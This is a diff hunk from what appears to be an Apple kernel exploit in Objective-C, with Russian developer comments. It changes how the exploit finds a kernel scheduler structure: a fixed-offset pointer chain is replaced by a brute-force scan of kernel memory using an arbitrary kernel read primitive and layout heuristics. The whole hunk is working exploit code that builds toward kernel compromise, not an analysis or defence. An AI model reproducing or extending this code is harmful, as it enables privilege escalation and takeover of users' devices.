@@ -6787,23 +6787,37 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t vcE = kpM2TClientVA(r, isTable, victim, @"opcE-victim");
         uint64_t ucE = kpLooksLikeKernelPointer(vcE) ? kp_untag_ptr(early_kread64(vcE + 0x30)) : 0;
         uint64_t provE = kpLooksLikeKernelPointer(ucE) ? kp_untag_ptr(early_kread64(ucE + 0xe8)) : 0;
-        // 1.9.233: scheduler = [pipe+0xb8] (записка р.39 в коде + P2-коммент —
-        // я ходил на [prov+0xb8], schedE=0 → op=0). Pipe через pipeMask
-        // [prov+0x180] → [prov+0x140+idx*8]; массивы sched+0xc8/+0x110, count
-        // sched+0xb8/+0x100. Матч credit=0x10 или UC back-ref.
+        // 1.9.234: scheduler — ПЕРЕБОРОМ, как оракул 1.9.147 (233: [prov+0xb8] и
+        // pipe дали мусорные counts — не они). Кандидаты: prov, его поля (0x00-
+        // 0x168) и их pointee (0x00-0x200). Layout: cnt@[c+0xb8] ∈ (0,0x2000],
+        // a1=[c+0xc8] a2=[c+0x110] kernel. Первый валидный = scheduler.
         uint64_t schedE = 0;
         if (kpLooksLikeKernelPointer(provE) && kpSafeToRead(provE)) {
-            uint64_t maskE = early_kread64(provE + 0x180);
-            int pidxE = -1;
-            for (int b = 0; b < 8; b++) if (maskE & (1ULL << b)) { pidxE = b; break; }
-            uint64_t pipeE = (pidxE >= 0) ? kp_untag_ptr(early_kread64(provE + 0x140 + (uint64_t)pidxE * 8)) : 0;
-            if (kpLooksLikeKernelPointer(pipeE) && kpSafeToRead(pipeE)) {
-                uint64_t c = kp_untag_ptr(early_kread64(pipeE + 0xb8));
-                uint64_t cnt0 = kpLooksLikeKernelPointer(c) ? early_kread64(c + 0xb8) : 0;
-                uint64_t a1 = kpLooksLikeKernelPointer(c) ? kp_untag_ptr(early_kread64(c + 0xc8)) : 0;
-                uint64_t a2 = kpLooksLikeKernelPointer(c) ? kp_untag_ptr(early_kread64(c + 0x110)) : 0;
-                if (kpLooksLikeKernelPointer(c) && cnt0 && cnt0 <= 0x2000 && kpLooksLikeKernelPointer(a1) && kpLooksLikeKernelPointer(a2)) schedE = c;
-                else schedE = pipeE;   // массивы могут быть и на самом pipe
+            uint64_t cand[40]; int cn = 0;
+            cand[cn++] = provE;
+            for (uint32_t o = 0; o + 8 <= 0x168 && cn < 20; o += 8) {
+                uint64_t p = kp_untag_ptr(early_kread64(provE + o));
+                if (!kpLooksLikeKernelPointer(p)) continue;
+                BOOL dup = NO;
+                for (int k = 0; k < cn; k++) if (cand[k] == p) { dup = YES; break; }
+                if (!dup) cand[cn++] = p;
+            }
+            for (int i = 0; i < cn && !schedE; i++) {
+                uint64_t c = cand[i];
+                if (!kpSafeToRead(c)) continue;
+                uint64_t cnt0 = early_kread64(c + 0xb8);
+                uint64_t a1 = kp_untag_ptr(early_kread64(c + 0xc8));
+                uint64_t a2 = kp_untag_ptr(early_kread64(c + 0x110));
+                if (cnt0 && cnt0 <= 0x2000 && kpLooksLikeKernelPointer(a1) && kpLooksLikeKernelPointer(a2)) { schedE = c; break; }
+                // уровень 2: указатели внутри кандидата
+                for (uint32_t o2 = 0; o2 + 8 <= 0x200 && !schedE; o2 += 8) {
+                    uint64_t p2 = kp_untag_ptr(early_kread64(c + o2));
+                    if (!kpLooksLikeKernelPointer(p2) || !kpSafeToRead(p2)) continue;
+                    uint64_t cnt2 = early_kread64(p2 + 0xb8);
+                    uint64_t b1 = kp_untag_ptr(early_kread64(p2 + 0xc8));
+                    uint64_t b2 = kp_untag_ptr(early_kread64(p2 + 0x110));
+                    if (cnt2 && cnt2 <= 0x2000 && kpLooksLikeKernelPointer(b1) && kpLooksLikeKernelPointer(b2)) { schedE = p2; break; }
+                }
             }
         }
         uint64_t opE = 0;
